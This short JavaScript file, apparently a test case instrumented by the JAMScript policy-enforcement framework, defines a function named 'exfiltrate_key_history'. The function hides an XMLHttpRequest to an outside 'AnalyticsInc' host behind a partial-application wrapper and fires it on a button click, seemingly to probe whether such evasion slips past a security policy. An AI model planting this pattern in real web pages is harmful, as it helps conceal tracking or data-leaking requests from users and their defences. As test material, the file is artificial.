
JAM.startProfile('load');
function exfiltrate_key_history(){function partial(func){function v0(){var v8=Array.prototype,v8=v8.slice,v8=JAMScript.callIntrospect(v8.call,v8,[arguments],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1),v8=JAMScript.callIntrospect(args.concat,args,[v8],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);return JAMScript.callIntrospect(func.apply,func,[this,v8],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)}var v6=Array.prototype,
v6=v6.slice,args=JAMScript.callIntrospect(v6.call,v6,[arguments,1],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);return v0}var v3=xmlhttp=new XMLHttpRequest,v7=xmlhttp.open,v7=partial(v7,"GET","http://AnalyticsInc:8000/submission.html?test=partial",!0);v3.openn=v7;JAMScript.callIntrospect(xmlhttp.openn,xmlhttp,[],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);JAMScript.callIntrospect(xmlhttp.send,xmlhttp,[null],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)}
var v4=document.getElementById("test");JAMScript.set(v4,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
